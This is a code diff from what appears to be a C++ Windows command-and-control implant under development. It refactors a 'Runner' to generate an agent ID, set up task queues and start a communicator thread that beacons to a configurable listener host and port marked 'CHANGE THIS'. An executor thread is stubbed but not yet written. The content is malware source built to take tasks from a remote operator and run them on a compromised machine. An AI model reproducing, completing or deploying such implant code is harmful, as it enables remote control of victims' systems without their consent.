@@ -5,25 +5,22 @@
 #include "communicators/base.h"
 #include "communicators/http.h"
 #include "utils/random.h"
+#include "utils/queue.h"
 
 /* Constructor */
-Runner::Runner() : winApiCustom(),
-                   communicator(HttpCommunicator(&winApiCustom, "127.0.0.1", 8080, "/path1\x00/path2\x00", NULL))
+Runner::Runner()
+    : winApiCustom(),
+      pAgentId(NULL),
+      TaskInputQueue(Queue(&winApiCustom, TRUE)),
+      TaskOutputQueue(Queue(&winApiCustom, TRUE))
 {
-    // Prepare Agent ID
-    this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(6);
+    // Generate and set Agent ID
+    this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(7); // 6 characters + 1 null-byte
     if (this->pAgentId != NULL)
     {
         RandomGenerator randomGenerator = RandomGenerator(&this->winApiCustom);
         randomGenerator.GenerateRandomStr(6, this->pAgentId);
     }
-
-    // Prepare ToSend and Received queues
-
-    // Set Agent ID in Communicator
-    this->communicator.SetAgentId(pAgentId);
-
-    // Prepare Executor
 }
 
 /* Destructor */
@@ -36,21 +33,25 @@ Runner::~Runner()
 
 void Runner::Run()
 {
-    // Add data to ToSend for registering this Agent
+    // Start Communicator thread
+    HttpCommunicatorThreadArgs httpCommunicatorThreadArgs;
+    httpCommunicatorThreadArgs.agentId = this->pAgentId;
+    httpCommunicatorThreadArgs.listenerHost = "127.0.0.1";               // CHANGE THIS
+    httpCommunicatorThreadArgs.listenerPort = 8080;                      // CHANGE THIS
+    httpCommunicatorThreadArgs.pUrlPathChoices = "/path1\x00/path2\x00"; // CHANGE THIS
+    httpCommunicatorThreadArgs.pWinApiCustom = &(this->winApiCustom);
+    httpCommunicatorThreadArgs.pTaskInputQueue = &(this->TaskInputQueue);
+    httpCommunicatorThreadArgs.pTaskOutputQueue = &(this->TaskOutputQueue);
 
-    // Start Communicator
-    /*
-    while (TRUE)
-    {
-        // Send any Task outputs and new Task Request to listener; receive new Tasks from Listener
+    HANDLE hThreadCommunicator = this->winApiCustom.CreateThreadCustom(
+        (LPTHREAD_START_ROUTINE)(HttpCommunicator::StartCommunicatorThread),
+        &httpCommunicatorThreadArgs);
+    if (hThreadCommunicator == NULL)
+        return;
 
-        // Store received new tasks
+    // Start Executor thread
 
-        // Execute all tasks for this agent and store Task output
-    }
-    */
-
-    // Start Executor
-
-    // Wait for Communicator and Executor to finish
+    // Wait for all threads to close, then close their handles
+    this->winApiCustom.loadedFunctions.WaitForSingleObject(hThreadCommunicator, INFINITE);
+    this->winApiCustom.loadedFunctions.CloseHandle(hThreadCommunicator);
 }
